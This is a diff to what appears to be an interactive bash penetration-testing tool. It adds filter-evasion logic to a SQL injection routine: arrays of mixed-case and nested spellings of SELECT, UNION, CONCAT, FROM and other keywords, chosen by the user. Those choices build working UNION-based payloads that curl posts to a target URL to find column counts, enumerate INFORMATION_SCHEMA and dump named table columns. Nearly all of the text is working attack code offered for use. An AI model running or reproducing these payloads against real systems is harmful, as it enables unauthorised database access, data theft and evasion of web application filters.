@@ -11267,8 +11267,66 @@ while true; do
 			read -p "(example with a single quote, email=hello@gmail.com\'): " PAR
 			if [[ "$PAR" != "" ]];
 			then
-				echo "$PAR"" UNION SELECT version() -- -"
-				curl -v -k -X POST -d "$PAR"" UNION SELECT version() -- -" "$TIP"
+				MSEL=("SELECT" "SELECt" "SELEcT" "SELEct" "SELeCT" "SELeCt" "SELecT" "SELect" "SElECT" "SElECt" "SElEcT" "SElEct" "SEleCT" "SEleCt" "SElecT" "SElect" "SeLECT" "SeLECt" "SeLEcT" "SeLEct" "SeLeCT" "SeLeCt" "SeLecT" "SeLect" "SelECT" "SelECt" "SelEcT" "SelEct" "SeleCT" "SeleCt" "SelecT" "Select" "sELECT" "sELECt" "sELEcT" "sELEct" "sELeCT" "sELeCt" "sELecT" "sELect" "sElECT" "sElECt" "sElEcT" "sElEct" "sEleCT" "sEleCt" "sElecT" "sElect" "seLECT" "seLECt" "seLEcT" "seLEct" "seLeCT" "seLeCt" "seLecT" "seLect" "selECT" "selECt" "selEcT" "selEct" "seleCT" "seleCt" "selecT" "select" "SELSELECTECT" "selselectect")
+				MUNI=("UNION" "UNIOn" "UNIoN" "UNIon" "UNiON" "UNiOn" "UNioN" "UNion" "UnION" "UnIOn" "UnIoN" "UnIon" "UniON" "UniOn" "UnioN" "Union" "uNION" "uNIOn" "uNIoN" "uNIon" "uNiON" "uNiOn" "uNioN" "uNion" "unION" "unIOn" "unIoN" "unIon" "uniON" "uniOn" "unioN" "union" "UNIUNIONON" "uniunionon")
+				MCON=("CONCAT" "CONCAt" "CONCaT" "CONCat" "CONcAT" "CONcAt" "CONcaT" "CONcat" "COnCAT" "COnCAt" "COnCaT" "COnCat" "COncAT" "COncAt" "COncaT" "COncat" "CoNCAT" "CoNCAt" "CoNCaT" "CoNCat" "CoNcAT" "CoNcAt" "CoNcaT" "CoNcat" "ConCAT" "ConCAt" "ConCaT" "ConCat" "ConcAT" "ConcAt" "ConcaT" "Concat" "cONCAT" "cONCAt" "cONCaT" "cONCat" "cONcAT" "cONcAt" "cONcaT" "cONcat" "cOnCAT" "cOnCAt" "cOnCaT" "cOnCat" "cOncAT" "cOncAt" "cOncaT" "cOncat" "coNCAT" "coNCAt" "coNCaT" "coNCat" "coNcAT" "coNcAt" "coNcaT" "coNcat" "conCAT" "conCAt" "conCaT" "conCat" "concAT" "concAt" "concaT" "concat" "CONCONCATCAT" "conconcatcat")
+				MLIM=("LIMIT" "LIMIt" "LIMiT" "LIMit" "LImIT" "LImIt" "LImiT" "LImit" "LiMIT" "LiMIt" "LiMiT" "LiMit" "LimIT" "LimIt" "LimiT" "Limit" "lIMIT" "lIMIt" "lIMiT" "lIMit" "lImIT" "lImIt" "lImiT" "lImit" "liMIT" "liMIt" "liMiT" "liMit" "limIT" "limIt" "limiT" "limit" "LIMLIMITIT" "limlimitit")
+				MOFF=("OFFSET" "OFFSEt" "OFFSeT" "OFFSet" "OFFsET" "OFFsEt" "OFFseT" "OFFset" "OFfSET" "OFfSEt" "OFfSeT" "OFfSet" "OFfsET" "OFfsEt" "OFfseT" "OFfset" "OfFSET" "OfFSEt" "OfFSeT" "OfFSet" "OfFsET" "OfFsEt" "OfFseT" "OfFset" "OffSET" "OffSEt" "OffSeT" "OffSet" "OffsET" "OffsEt" "OffseT" "Offset" "oFFSET" "oFFSEt" "oFFSeT" "oFFSet" "oFFsET" "oFFsEt" "oFFseT" "oFFset" "oFfSET" "oFfSEt" "oFfSeT" "oFfSet" "oFfsET" "oFfsEt" "oFfseT" "oFfset" "ofFSET" "ofFSEt" "ofFSeT" "ofFSet" "ofFsET" "ofFsEt" "ofFseT" "ofFset" "offSET" "offSEt" "offSeT" "offSet" "offsET" "offsEt" "offseT" "offset" "OFFOFFSETSET" "offoffsetset")
+				MWHE=("WHERE" "WHERe" "WHErE" "WHEre" "WHeRE" "WHeRe" "WHerE" "WHere" "WhERE" "WhERe" "WhErE" "WhEre" "WheRE" "WheRe" "WherE" "Where" "wHERE" "wHERe" "wHErE" "wHEre" "wHeRE" "wHeRe" "wHerE" "wHere" "whERE" "whERe" "whErE" "whEre" "wheRE" "wheRe" "wherE" "where" "WHEWHERERE" "whewherere")
+				MFRO=("FROM" "FROm" "FRoM" "FRom" "FrOM" "FrOm" "FroM" "From" "fROM" "fROm" "fRoM" "fRom" "frOM" "frOm" "froM" "from" "FRFROMOM" "frfromom")
+				echo "A SQLinjection could be triggered, You can choose every statement to bypass"
+				echo "Choose SELECT statement:"
+				select VSEL in "${MSEL[@]}"
+				do
+					SELECT="$VSEL"
+				break
+				done
+				echo "Choose UNION statement:"
+				select VUNI in "${MUNI[@]}"
+				do
+					UNION="$VUNI"
+				break
+				done
+				echo "Choose CONCAT statement:"
+				select VCON in "${MCON[@]}"
+				do
+					CONCAT="$VCON"
+				break
+				done
+				echo "Choose LIMIT statement:"
+				select VLIM in "${MLIM[@]}"
+				do
+					LIMIT="$VLIM"
+				break
+				done
+				echo "Choose OFFSET statement:"
+				select VOFF in "${MOFF[@]}"
+				do
+					OFFSET="$VOFF"
+				break
+				done
+				echo "Choose FROM statement:"
+				select VFRO in "${MFRO[@]}"
+				do
+					FROM="$VFRO"
+				break
+				done
+				echo "Choose WHERE statement:"
+				select VWHE in "${MWHE[@]}"
+				do
+					WHERE="$VWHE"
+				break
+				done
+				MSEL=""
+				MUNI=""
+				MCON=""
+				MLIM=""
+				MOFF=""
+				MWHE=""
+				MFRO=""
+
+				echo "$PAR"" ""$UNION"" ""$SELECT"" version() -- -"
+				curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" version() -- -" "$TIP"
 				for I in {1..9}
 				do
 					if [[ "$Q" == "" ]];
@@ -11277,8 +11335,8 @@ while true; do
 					else
 						Q="$Q""$I"","
 					fi
-					echo "$PAR"" UNION SELECT ""$Q""version() -- -"
-					curl -v -k -X POST -d "$PAR"" UNION SELECT ""$Q""version() -- -" "$TIP"
+					echo "$PAR"" ""$UNION"" ""$SELECT"" ""$Q""version() -- -"
+					curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT ""$Q""version() -- -" "$TIP"
 				done
 				echo "Digit the position of version, if was the first occurence, digit 1, otherwise digit the position number ignoring other numbers"
 				echo "'1,2,8.0.15', the position will be 3 (ignoring the other numbers)"
@@ -11312,10 +11370,10 @@ while true; do
 						do
 							for B in $(seq 0 $FST)
 							do
-								echo "$PAR"" UNION SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -"
-								curl -v -k -X POST -d "$PAR"" UNION SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
-								##echo "$PAR"" UNION SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -"
-								##curl -v -k -X POST -d "$PAR"" UNINON SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
+								echo "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
+								curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
+								##echo "$PAR"" ""$UNION"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
+								##curl -v -k -X POST -d "$PAR"" ""$UNINON"" ""$SELECT"" ""$PES""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
 							done
 						done
 					else
@@ -11323,10 +11381,10 @@ while true; do
 						do
 							for B in $(seq 0 $FST)
 							do
-								echo "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -"
-								curl -v -k -X POST -d "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
-								##echo "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS LIMIT ""$A"" OFFSET ""$B"" -- -"
-								##curl -v -k -X POST -d "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
+								echo "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
+								curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$WHERE"" TABLE_SCHEMA != 'Information_Schema' ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
+								##echo "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -"
+								##curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") ""$FROM"" INFORMATION_SCHEMA.COLUMNS ""$LIMIT"" ""$A"" ""$OFFSET"" ""$B"" -- -" "$TIP"
 							done
 						done
 					fi
@@ -11337,16 +11395,30 @@ while true; do
 						read -p "(example, Employes, quit for exit): " TBLN
 						if [[ "$TBLN" != "" ]];
 						then
-							echo "Digit the COLUMN_NAME, the secondo record (TABLE_SCHEMA:TABLE_NAME:COLUMN_NAME)"
-							read -p "(example, Person, quit for exit): " CLMN
-							if [[ "$CLMN" != "" ]];
+							if [[ "$TBLN" != "quit" ]];
 							then
-								curl -v -k -X POST -d "$PAR"" UNION SELECT CONCAT(""$CLMN"") FROM ""$TBLN"" -- -" "$TIP"
+
+								echo "Digit the COLUMN_NAME, the secondo record (TABLE_SCHEMA:TABLE_NAME:COLUMN_NAME)"
+								read -p "(example, Person, quit for exit): " CLMN
+								if [[ "$CLMN" != "" ]];
+								then
+									if [[ "$CLMN" != "quit" ]];
+									then
+										curl -v -k -X POST -d "$PAR"" ""$UNION"" ""$SELECT"" ""$CONCAT""(""$CLMN"") ""$FROM"" ""$TBLN"" -- -" "$TIP"
+									fi
+								fi
 							fi
 						fi
 					done
 					PES=""
 					POS=""
+					UNION=""
+					SELECT=""
+					CONCAT=""
+					FROM=""
+					WHERE=""
+					LIMIT=""
+					OFFSET=""
 				fi
 			fi
 		fi
